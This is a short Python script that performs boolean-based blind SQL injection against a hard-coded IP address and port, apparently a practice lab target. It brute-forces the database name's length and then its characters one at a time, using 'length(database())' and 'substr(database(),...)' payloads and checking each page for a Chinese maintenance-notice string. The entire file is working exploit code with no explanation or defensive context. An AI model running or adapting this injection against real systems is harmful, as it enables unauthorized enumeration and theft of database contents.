# _*_  coding:utf-8 _*_
import requests
import sys


def lendb():
    for i in range(1,20):
        payload = '''/?id=1  and length(database()) > %s''' %i
        url = '''http://219.153.49.228:47245/new_list.php'''
        req = requests.get(url+payload+"%23") # %23--url decode is #
        if u"关于平台停机维护的通知" in req.text:
            print(i)
        else:
            print("database_length:",i)
            break

lendb()

def dbname():
    name = ""
    for j in range(1,11): # dabase length == 8
        for k in "zxcvbnmasdfghjklqwertyuiop":
            url = "http://219.153.49.228:47245/new_list.php/?id=1  and substr(database(),%d,1)='%s'" %(j,k)
            req = requests.get(url+"%23")
            if u"关于平台停机维护的通知" in req.text:
                name = name +k
                print(name)
                break #跳出k循环

    print("database_name:", name)

dbname()








